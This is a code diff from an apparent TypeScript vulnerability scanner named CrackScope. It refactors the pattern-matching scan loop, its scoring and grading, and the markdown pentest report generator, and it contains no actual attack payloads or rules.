-};
+function isComment(line: string): boolean {
+  const t = line.trim();
+  return (
+    t.startsWith("//") || t.startsWith("#") || t.startsWith("/*") ||
+    t.startsWith("*") || t.startsWith("<!--") || t.startsWith("--")
+  );
+}
 
-/** Heuristic "attack simulation phases" shown while scanning. */
-export const ATTACK_PHASES = [
-  "Recon — fingerprinting languages & entry points",
-  "Injection probes — SQL / command / template",
-  "XSS & deserialization payloads",
-  "Secrets sweep — keys, tokens, credentials",
-  "Crypto audit — hashes, randomness, TLS",
-  "Access control & configuration checks",
-  "Compiling pentest report",
-];
-
-export function runScan(files: ScanFile[], name: string): ScanReport {
+export function scan(inputs: ScanInput[]): ScanResult {
+  const started = performance.now();
   const findings: Finding[] = [];
+  const languages = new Set<string>();
+  let linesScanned = 0;
 
-  for (const file of files) {
-    const lines = file.content.split("\n");
-    const perRuleCount = new Map<string, number>();
+  for (const input of inputs) {
+    const language = extToLanguage(input.name);
+    if (language !== "Unknown") languages.add(language);
+    const lines = input.content.split("\n");
+    linesScanned += lines.length;
 
-    lines.forEach((lineText, idx) => {
-      if (lineText.length > 400) return;
-      for (const rule of RULES) {
-        const cap = rule.maxPerFile ?? 5;
-        if ((perRuleCount.get(rule.id) ?? 0) >= cap) continue;
-        if (!rule.pattern.test(lineText)) continue;
-        if (rule.exclusion && rule.exclusion.test(lineText)) continue;
-        perRuleCount.set(rule.id, (perRuleCount.get(rule.id) ?? 0) + 1);
+    for (const rule of RULES) {
+      let matches = 0;
+      const cap = rule.maxMatchesPerFile ?? 5;
+      for (let i = 0; i < lines.length && matches < cap; i++) {
+        const line = lines[i];
+        if (isComment(line)) continue;
+        if (rule.safeHints?.some((h) => line.toLowerCase().includes(h.toLowerCase()))) continue;
+        const m = rule.pattern.exec(line);
+        if (!m) continue;
+        matches++;
         findings.push({
           ruleId: rule.id,
           title: rule.title,
           severity: rule.severity,
           category: rule.category,
           owasp: rule.owasp,
-          file: file.name,
-          line: idx + 1,
-          snippet: lineText.trim().slice(0, 240),
+          file: input.name,
+          line: i + 1,
+          snippet: line.trim().slice(0, 220),
           description: rule.description,
           remediation: rule.remediation,
           payload: rule.payload,
         });
       }
-    });
+    }
   }
 
   findings.sort((a, b) => {
-    const s = SEVERITY_ORDER.indexOf(a.severity) - SEVERITY_ORDER.indexOf(b.severity);
-    if (s !== 0) return s;
-    return a.file.localeCompare(b.file) || a.line - b.line;
+    const order: Severity[] = ["critical", "high", "medium", "low", "info"];
+    return order.indexOf(a.severity) - order.indexOf(b.severity) || a.file.localeCompare(b.file) || a.line - b.line;
   });
 
-  const counts = { ...EMPTY_COUNTS };
-  for (const f of findings) counts[f.severity] += 1;
+  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
+  let penalty = 0;
+  for (const f of findings) {
+    counts[f.severity]++;
+    penalty += SEVERITY_WEIGHT[f.severity];
+  }
 
-  const linesScanned = files.reduce((acc, f) => acc + f.content.split("\n").length, 0);
-  const deductions = findings.reduce((acc, f) => acc + SEVERITY_WEIGHT[f.severity], 0);
-  const score = Math.max(0, Math.min(100, Math.round(100 - deductions)));
+  const score = Math.max(0, Math.min(100, Math.round(100 - penalty)));
+  const grade = score >= 90 ? "A" : score >= 75 ? "B" : score >= 60 ? "C" : score >= 40 ? "D" : "F";
 
   return {
-    name,
-    createdAt: Date.now(),
     score,
-    grade: gradeFor(score),
-    filesScanned: files.length,
+    grade,
+    filesScanned: inputs.length,
     linesScanned,
+    languages: [...languages],
     counts,
     findings,
-    phases: ATTACK_PHASES,
+    durationMs: Math.round(performance.now() - started),
   };
 }
 
-export function reportToMarkdown(report: ScanReport): string {
-  const d = new Date(report.createdAt).toISOString();
-  const lines: string[] = [
-    `# CrackScope Penetration Test Report — ${report.name}`,
-    ``,
-    `- **Date:** ${d}`,
-    `- **Files scanned:** ${report.filesScanned} (${report.linesScanned} lines)`,
-    `- **Security score:** ${report.score}/100 (grade ${report.grade})`,
-    `- **Findings:** ${report.counts.critical} critical, ${report.counts.high} high, ${report.counts.medium} medium, ${report.counts.low} low`,
-    ``,
-    `## Methodology`,
-    ``,
-    `Heuristic attack simulation (Part 1 engine): pattern-based injection probes, secrets sweep, crypto audit, and configuration review mapped to OWASP Top 10 (2021).`,
-    ``,
-    `## Findings`,
-    ``,
-  ];
-  if (report.findings.length === 0) {
-    lines.push(`No vulnerabilities detected by the Part 1 engine. Heavier AST-based detection arrives in Part 3.`);
+export function buildMarkdownReport(name: string, result: ScanResult): string {
+  const lines: string[] = [];
+  lines.push(`# CrackScope Pentest Report — ${name}`);
+  lines.push("");
+  lines.push(`Generated: ${new Date().toISOString()}`);
+  lines.push(
+    `Scope: ${result.filesScanned} file(s), ${result.linesScanned} lines (${result.languages.join(", ") || "n/a"})`,
+  );
+  lines.push(`Security score: ${result.score}/100 (grade ${result.grade})`);
+  lines.push(
+    `Findings: ${result.counts.critical} critical · ${result.counts.high} high · ${result.counts.medium} medium · ${result.counts.low} low`,
+  );
+  lines.push("");
+  lines.push("## Executive summary");
+  lines.push(
+    result.counts.critical > 0
+      ? "Critical-severity weaknesses were identified that are realistically exploitable. Remediation should be treated as an emergency: contain exposure, rotate any leaked credentials, and apply the fixes below before the next release."
+      : result.counts.high > 0
+        ? "No critical weaknesses were found, but high-severity issues require prompt remediation and follow-up verification."
+        : "No high or critical weaknesses were detected in the analyzed scope. Continue periodic testing as code changes.",
+  );
+  lines.push("");
+  lines.push("## Methodology");
+  lines.push(
+    "Automated attack simulation: pattern-based weakness discovery across injection, XSS, command execution, cryptography, authentication, access control, SSRF, deserialization, and misconfiguration classes (OWASP Top 10 2021 mapped). Each finding includes a simulated exploitation path.",
+  );
+  lines.push("");
+  lines.push("## Findings");
+  if (result.findings.length === 0) {
+    lines.push("No findings. 🎉");
   }
-  report.findings.forEach((f, i) => {
-    lines.push(
-      `### ${i + 1}. [${f.severity.toUpperCase()}] ${f.title} (${f.ruleId})`,
-      ``,
-      `- **File:** ${f.file}:${f.line}`,
-      `- **OWASP:** ${f.owasp}`,
-      `- **Category:** ${f.category}`,
-      `- **Code:** \`${f.snippet}\``,
-      ``,
-      f.description,
-      ``,
-      `**Simulated attack:** ${f.payload}`,
-      ``,
-      `**Remediation:** ${f.remediation}`,
-      ``,
-    );
+  result.findings.forEach((f, i) => {
+    lines.push("");
+    lines.push(`### ${i + 1}. [${f.severity.toUpperCase()}] ${f.title}`);
+    lines.push(`- Rule: ${f.ruleId} · Category: ${f.category} · ${f.owasp}`);
+    lines.push(`- Location: ${f.file}:${f.line}`);
+    lines.push("```");
+    lines.push(f.snippet);
+    lines.push("```");
+    lines.push(f.description);
+    lines.push(`- Simulated attack: ${f.payload.replace(/\n/g, " / ")}`);
+    lines.push(`- Remediation: ${f.remediation}`);
   });
   return lines.join("\n");
 }
